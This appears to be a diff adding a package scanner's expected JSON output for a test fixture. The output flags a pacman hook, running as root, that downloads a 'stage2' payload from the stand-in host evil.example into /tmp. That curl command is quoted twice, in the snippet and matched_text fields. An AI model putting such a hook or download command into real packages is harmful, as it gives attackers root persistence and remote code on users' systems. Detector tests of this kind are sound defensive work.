@@ -1,0 +1,30 @@
+{
+  "package_name": "hooksubdir",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "PERSIST-012",
+      "severity": "high",
+      "category": "persistence",
+      "title": "pacman hook runs a fetch, a shell command or a user/temp path",
+      "description": "zz-sync.hook is a libalpm hook (runs as root) whose Exec downloads, or runs something from /tmp, /dev/shm or a home directory. A hook like this is a root persistence mechanism.",
+      "location": {
+        "file": "tests/fixtures/malicious/shipped-hook-subdir/hooks/zz-sync.hook",
+        "line": 8,
+        "column": null,
+        "snippet": "Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2"
+      },
+      "recommendation": "Do not install. A hook should run a fixed, packaged program with a narrow Target.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/shipped-hook-subdir/PKGBUILD",
+    "tests/fixtures/malicious/shipped-hook-subdir/hooks/zz-sync.hook"
+  ],
+  "timestamp": "2026-11-10T14:51:08.706353159Z",
+  "scan_duration_ms": 24
+}
